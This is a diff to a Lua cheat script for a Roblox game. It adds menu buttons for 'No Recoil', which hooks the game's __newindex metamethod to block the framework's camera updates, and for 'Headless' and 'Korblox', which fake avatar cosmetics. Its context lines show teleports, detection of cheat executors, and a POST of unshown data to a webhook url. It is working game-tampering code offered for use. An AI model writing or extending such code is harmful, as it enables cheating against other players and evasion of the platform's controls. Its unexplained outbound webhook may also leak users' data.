@@ -485,6 +485,59 @@ local ff = teleportsTab:Section("Gym Top")
 ff:Button("Teleport", function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-76.178093, 56.6998138, -629.940979, -0.9998914, -1.09370752e-07, 0.0147391548, -1.0945012e-07, 1, -4.57786342e-09, -0.0147391548, -6.1905685e-09, -0.9998914)
 end) 
+local ff = miscTab:Section("No Recoil")
+ff:Button("No Recoil", function()
+	function isframework(L_158_arg0)
+		if tostring(L_158_arg0) == "Framework" then
+			return true
+		end
+		return false
+	end
+	function checkArgs(L_159_arg0, L_160_arg1)
+		if tostring(L_159_arg0):lower():find("camera") and tostring(L_160_arg1) == "CFrame" then
+			return true
+		end
+		return false
+	end
+	newindex = hookmetamethod(game, "__newindex", function(L_161_arg0, L_162_arg1, L_163_arg2)
+		local L_164_ = getcallingscript()
+		if isframework(L_164_) and checkArgs(L_161_arg0, L_162_arg1) then
+			return;
+		end
+		return newindex(L_161_arg0, L_162_arg1, L_163_arg2)
+	end)
+end)
+local ff = miscTab:Section("Headless")
+ff:Button("Headless", function()
+	local L_393_ = game.Players.LocalPlayer.Character
+	local L_394_ = L_393_:WaitForChild("Head")
+	local L_395_ = L_394_:WaitForChild("face")
+	L_395_.Transparency = 1 --Texture = "rbxassetid://209712379"
+	L_394_.Transparency = 1
+
+end)
+local ff = miscTab:Section("Korblox")
+ff:Button("Korblox", function()
+	local L_396_ = game.Players.LocalPlayer.Character
+	local L_397_ = game.Players.LocalPlayer.Character
+	local L_398_ = L_396_.Head
+	local L_399_ = L_398_.face
+	local L_400_ = L_397_.RightFoot
+	local L_401_ = L_397_.RightLowerLeg
+	local L_402_ = L_397_.RightUpperLeg
+	local L_403_ = L_397_.LeftFoot
+	local L_404_ = L_397_.LeftLowerLeg
+	local L_405_ = L_397_.LeftUpperLeg
+    
+    -- Right
+	L_400_.MeshId = "http://www.roblox.com/asset/?id=902942093"
+	L_401_.MeshId = "http://www.roblox.com/asset/?id=902942093"
+	L_402_.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	L_402_.TextureID = "http://roblox.com/asset/?id=902843398"
+	L_400_.Transparency = 1
+	L_401_.Transparency = 1
+    
+end)
 
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -518,3 +571,4 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+
